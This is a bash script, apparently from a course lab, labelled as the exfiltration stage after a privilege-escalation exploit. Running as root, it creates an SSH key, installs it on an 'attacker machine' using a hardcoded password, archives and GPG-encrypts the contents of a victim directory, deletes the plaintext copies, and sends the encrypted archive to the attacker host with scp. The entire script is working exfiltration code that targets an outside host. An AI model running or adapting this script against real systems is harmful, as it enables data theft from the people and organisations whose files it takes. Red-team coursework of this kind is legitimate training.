#!/bin/bash

# Run Gp5_PEexploit.sh located at /home/resch to ensure that privilege escalation has happened and the current user is root

# manual steps
# /home/resch/.scripts/Gp5_exfiltration_target.sh
echo "[+] Begin exfiltration preparation..."
# Generate SSH key pair and copy it to the attacker machine:
echo "[+] Generating SSH key pair and copying it to the attacker machine..."
ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver -N ""
chmod 400 /root/.ssh/id_rsa_Cserver.pub
sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver.pub -o StrictHostKeyChecking=no vagrant@172.18.0.3

cd /home/resch/destination
touch exfiltrate_backups.tar.gz
echo "[+] Archiving all files and folders to exfiltrate..."
tar --exclude=exfiltrate_backups.tar.gz -zcf exfiltrate_backups.tar.gz .
echo "ict3204pwd" > pass.txt

# Encrypt the archive and delete the original archived file
echo "[+] Encrypting the archive..."
gpg --batch --passphrase-file pass.txt -c --cipher-algo AES256 exfiltrate_backups.tar.gz
rm exfiltrate_backups.tar.gz
rm pass.txt

cd /home/resch/.ssh

# Send the tar file to attacker using scp
scp -i /root/.ssh/id_rsa_Cserver /home/resch/destination/exfiltrate_backups.tar.gz.gpg vagrant@172.18.0.3:/home/vagrant/exfiltrated/
echo "[+] Exfiltration complete!"